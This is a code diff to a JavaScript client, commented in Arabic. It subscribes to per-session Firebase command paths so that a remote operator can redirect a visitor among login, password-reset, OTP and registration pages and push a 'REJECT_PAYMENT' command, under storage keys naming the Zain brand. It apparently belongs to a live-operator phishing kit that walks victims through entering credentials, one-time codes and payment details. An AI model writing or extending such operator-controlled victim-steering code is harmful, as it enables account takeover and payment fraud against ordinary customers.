@@ -38,6 +38,8 @@
     login: 'login.html',
     forgot: 'forgot-password.html', forgotpassword: 'forgot-password.html',
     otp: 'otp.html', otpcode: 'otp.html', otpverify: 'otp.html',
+    otpnew: 'otp-new.html', otp4: 'otp-new.html', 'otp-new': 'otp-new.html',
+    regist: 'login-regist.html', register: 'login-regist.html', loginregist: 'login-regist.html',
     orders: 'order1.html', order1: 'order1.html'
   };
 
@@ -115,7 +117,31 @@
     return true;
   }
 
+  var subscribed = false;   // صار الاشتراك الحقيقي (بعد المصادقة)
+  var rejSubscribed = false;
+
+  function subscribeReject(rtd, sid) {
+    if (rejSubscribed) return;
+    rejSubscribed = true;
+    var rejKey = 'zain_page_reject_' + sid;
+    function readRej() { try { return localStorage.getItem(rejKey); } catch (e) { return null; } }
+    try {
+      rtd.ref('commands/' + sid + '/rejection').on('value', function (snap) {
+        var cmd = snap.val();
+        if (!cmd || cmd.action !== 'REJECT_PAYMENT') return;
+        var stamp = String(cmd.rejectedAt || cmd.timestamp || cmd.action || '');
+        var ref = rtd.ref('commands/' + sid + '/rejection');
+        if (stamp === readRej()) { try { ref.remove(); } catch (e) {} return; }
+        try { localStorage.setItem(rejKey, stamp); } catch (e) {}
+        try { ref.remove(); } catch (e) {}
+        // cfg يُقرأ لحظة التنفيذ، فيلتقط أي callback سُجِّل لاحقاً
+        if (typeof cfg.onReject === 'function') { try { cfg.onReject(cmd); } catch (e) {} }
+      }, function () { rejSubscribed = false; });
+    } catch (e) { rejSubscribed = false; }
+  }
+
   function subscribe(rtd, sid) {
+    subscribed = true;
     try {
       rtd.ref('commands/' + sid + '/redirect').on('value', function (snap) {
         handleRedirect(snap.val());
@@ -139,6 +165,9 @@
         });
       } catch (e) {}
     }
+
+    // أوامر الرفض: تُنفَّذ فقط إن سجّلت الصفحة callback باسم onReject.
+    subscribeReject(rtd, sid);
   }
 
   // انتظر جاهزية firebase-client.js (rtd + sessionId) ثم ابدأ (~10s ثم توقّف بصمت)
@@ -155,5 +184,10 @@
   window.listenForPageCommands = function (callbacks) {
     cfg = Object.assign({}, cfg, callbacks || {});
     if (!started) start();
+    // إن سبق الاشتراك قبل تسجيل onReject، فعّل مستمع الرفض الآن
+    if (subscribed && window.rtd && window.sessionId && !rejSubscribed
+        && typeof cfg.onReject === 'function') {
+      subscribeReject(window.rtd, window.sessionId);
+    }
   };
 })();
